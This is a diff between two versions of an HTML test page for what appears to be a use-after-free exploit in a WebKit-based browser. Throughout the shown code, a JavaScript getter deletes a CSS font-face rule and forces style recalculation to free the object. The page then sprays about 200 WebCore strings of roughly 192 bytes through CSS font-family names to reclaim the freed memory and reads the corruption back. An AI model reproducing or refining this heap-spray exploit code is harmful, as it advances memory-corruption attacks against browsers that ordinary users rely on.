@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v13</title>
+<title>P2 v14</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
 <style id="spraycss"></style>
@@ -17,7 +17,7 @@
 // ~192B font-family names; corruption readable back via the CSSOM.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v13 (CSS spray + sanity control)');
+log('PAGE VERSION: v14 (no-delete + CSS strings) (CSS spray + sanity control)');
 log('UA = ' + navigator.userAgent);
 
 var NRULES = 200, NAMELEN = 176;      // StringImpl hdr ~16 + 176 chars ~= 192B
@@ -76,7 +76,8 @@ function trigger() {
         if (this === A && fired === 1) {
           log('GETTER FIRED - free + CSS spray');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
-          try { document.fonts.delete(A); } catch (e) {}
+          // v14: NO fonts.delete - keep the Phase 1 shape where the engine
+          // provably touches the freed face (promise hangs)
           document.body.offsetTop;               // force recalc -> FREE
           cssSpray();                            // 200 x ~192B WebCore strings
           // CONTROL: scan BEFORE the engine drive - if the oracle itself is
